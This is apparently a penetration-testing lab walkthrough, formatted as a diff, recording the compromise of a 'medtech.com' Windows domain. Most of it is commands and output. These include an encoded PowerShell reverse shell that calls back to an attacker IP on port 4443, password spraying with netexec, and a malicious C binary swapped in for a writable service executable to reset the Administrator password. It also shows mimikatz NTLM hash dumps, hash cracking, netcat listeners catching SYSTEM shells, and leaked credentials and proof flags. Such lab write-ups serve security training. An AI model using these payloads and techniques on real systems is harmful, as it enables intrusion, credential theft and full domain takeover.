+proxychains -q ./atexec.py 'medtech.com'/'leon':'rabbit:)'@'172.16.247.82' 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA1ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
+
+
+Enumerting with earlier found mario user revealed it is a shared password with yoshi
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ proxychains -q netexec rdp 172.16.232.10 172.16.232.11 172.16.232.12 172.16.232.13 172.16.232.82 172.16.232.83 172.16.232.254 -u username.txt -d medtech.com -p Mushroom!
+RDP         172.16.232.12   3389   DEV04            [*] Windows 10 or Windows Server 2016 Build 20348 (name:DEV04) (domain:medtech.com) (nla:True)
+RDP         172.16.232.82   3389   CLIENT01         [*] Windows 10 or Windows Server 2016 Build 22000 (name:CLIENT01) (domain:medtech.com) (nla:True)
+RDP         172.16.232.12   3389   DEV04            [+] medtech.com\Yoshi:Mushroom! (Pwn3d!)
+RDP         172.16.232.82   3389   CLIENT01         [+] medtech.com\Yoshi:Mushroom! (Pwn3d!)
+Running nxc against 7 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+
+sudo proxychains -q xfreerdp /u:Yoshi /d:medtech.com /v:172.16.232.82 
+
+PS C:\Windows\system32> whoami
+medtech\yoshi
+PS C:\Windows\system32> hostname
+CLIENT01
+PS C:\Windows\system32>
+
+Enumeration on the machine found nothing interesting
+
+We move to the DEV\04
+sudo proxychains -q xfreerdp /u:Yoshi /d:medtech.com /v:172.16.232.82 
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\yoshi> whoami
+medtech\yoshi
+PS C:\Users\yoshi> hostname
+DEV04
+PS C:\Users\yoshi>
+
+First, the enumaration gave a false positive result, we found ourselves as normal user in the DEV machine. therefore, we started looking for other ways to escalate our privilege. We found an exe file Inside a temp folder. The file ACL was misconfigured that allow Yoshi modifying permission to the file.
+
+Get-Acl backup.exe
+
+In our kali, we crafted a .C script and compiled it naming the output backup.exe. The script is changing the local administrator password
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user Administrator password123!");
+  
+  return 0;
+}
+
+
+compiled the code using a kali tool using x86_64-w64-mingw32-gcc backup.c -o backup.exe 
+
+and transfered the tool to our windows
+
+# we monitored the process to see how it is executing using this command
+Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 30
+
+
+Watch-Command comes from here: https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
+
+We copied into a notepad file named wc.ps1 then imported it as a module and was able to use it with the above command to monitor the process
+
+We changed the exited backup.exe to our own backup.exe and it executed automatically and changed the local admin password granting us an admin shell
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+dev04\administrator
+PS C:\Windows\system32>
+
+We used mimikatz to dump leon's ntlm hash
+
+Authentication Id : 0 ; 361511 (00000000:00058427)
+Session           : Interactive from 1
+User Name         : leon
+Domain            : MEDTECH
+Logon Server      : DC01
+Logon Time        : 4/17/2024 12:20:16 PM
+SID               : S-1-5-21-976142013-3766213998-138799841-1105
+        msv :
+         [00000003] Primary
+         * Username : leon
+         * Domain   : MEDTECH
+         * NTLM     : 2e208ad146efda5bc44869025e06544a
+         * SHA1     : 8d1c9e13d2d2c20dbee8b4eacb20b73f06573c96
+         * DPAPI    : a7bad14f64c3cf0d7ae2b5f6392a0b6d
+
+2e208ad146efda5bc44869025e06544a: rabbit:)
+#hashcat provide a HEX output because of the sign on it
+
+We used this website to crack https://ntlm.pw/
+
+netexec proves that leon is an admin in all machine and we are able to acess all using atexec.py
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ proxychains -q netexec smb 172.16.247.10 172.16.247.11 172.16.247.12 172.16.247.13 172.16.247.82 172.16.247.83 172.16.247.254 -u leon -d medtech.com -p "rabbit:)"
+SMB         172.16.247.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
+SMB         172.16.247.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.254  445    WEB02            [*] Windows Server 2022 Build 20348 x64 (name:WEB02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
+SMB         172.16.247.10   445    DC01             [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.82   445    CLIENT01         [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.11   445    FILES02          [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.13   445    PROD01           [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.254  445    WEB02            [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.12   445    DEV04            [+] medtech.com\leon:rabbit:) (Pwn3d!)
+SMB         172.16.247.83   445    CLIENT02         [+] medtech.com\leon:rabbit:) (Pwn3d!)
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ nc -nvlp 4443  
+listening on [any] 4443 ...
+connect to [192.168.45.225] from (UNKNOWN) [192.168.247.121] 62649
+whoami
+nt authority\system
+PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+DC01
+PS C:\Windows\system32> 
+
+PS C:\users\leon> cd Desktop
+PS C:\users\leon\Desktop> ls
+PS C:\users\leon\Desktop> cd ..
+PS C:\users\leon> cd ..
+PS C:\users> cd administrator
+PS C:\users\administrator> cd Desktop
+PS C:\users\administrator\Desktop> ls
+
+
+    Directory: C:\users\administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        11/29/2022   2:41 PM             30 credentials.txt                                                      
+-a----        11/19/2024   5:49 AM             34 proof.txt                                                            
+
+
+PS C:\users\administrator\Desktop> cat credentials.txt
+web01: offsec/century62hisan51
+PS C:\users\administrator\Desktop> cat proof.txt
+6c3a13d847e75e6f4dff46187374336c
+
+┌──(kali㉿kali)-[~/medtech]
+└─$ ssh offsec@192.168.247.120                                      
+offsec@192.168.247.120's password: 
+Linux WEB01 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Dec  1 02:15:01 2022
+offsec@WEB01:~$ whoami
+offsec
+offsec@WEB01:~$ hostname
+WEB01
+offsec@WEB01:~$ 
+
+──(kali㉿kali)-[~]
+└─$ nc -nvlp 4443
+listening on [any] 4443 ...
+connect to [192.168.45.225] from (UNKNOWN) [192.168.247.121] 63752
+whoami
+nt authority\system
+PS C:\Windows\system32> whoami
+nt authority\system
+PS C:\Windows\system32> hostname
+PROD01
+PS C:\Windows\system32> 
+
+──(kali㉿kali)-[~]
+└─$ nc -nvlp 4443
+listening on [any] 4443 ...
+connect to [192.168.45.225] from (UNKNOWN) [192.168.247.121] 62896
+whoami
+nt authority\system
+PS C:\Windows\system32> hostnamee
+PS C:\Windows\system32> hostname
+CLIENT02
+PS C:\Windows\system32>
+
